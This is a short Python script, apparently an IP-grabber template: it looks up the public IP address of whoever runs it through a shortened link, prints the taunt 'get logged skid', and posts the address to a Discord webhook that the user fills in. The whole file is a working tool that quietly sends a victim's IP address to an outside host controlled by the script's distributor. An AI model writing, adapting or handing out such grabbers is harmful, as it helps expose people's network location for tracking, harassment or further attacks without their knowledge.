import time
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen


webhookurl = 'UR WEBHOOK HERE'


ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
print("get logged skid")

webhook = DiscordWebhook(url=f'{webhookurl}', content=f'Ip adress: {ip} \n\nMade by bored#7166')
time.sleep(2)
response = webhook.execute()






